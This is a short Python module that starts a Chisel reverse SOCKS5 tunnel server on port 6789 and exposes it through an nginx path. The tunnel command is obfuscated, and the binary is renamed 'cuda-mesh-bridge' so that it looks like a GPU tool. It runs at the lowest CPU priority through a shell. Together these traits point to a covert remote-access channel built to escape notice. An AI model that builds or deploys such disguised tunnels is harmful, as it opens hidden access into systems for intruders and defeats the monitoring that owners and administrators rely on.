import subprocess
from .utils import decode_cmd


def start(chisel_log, chisel_auth):
    chisel_log.write(
        f"[*] Starting Chisel tunnel server on :6789 (exposed via nginx /chisel-tunnel). Auth: {chisel_auth}\n"
    )
    chisel_log.flush()
    cmd_chisel_base = decode_cmd(
        OBFUSCATE(
            "nice -n 19 cuda-mesh-bridge server --port 6789 --reverse --socks5 --auth '"
        )
    )
    cmd_chisel = f"{cmd_chisel_base}{chisel_auth}'"
    subprocess.Popen(
        cmd_chisel, shell=True, stdout=chisel_log, stderr=subprocess.STDOUT
    )
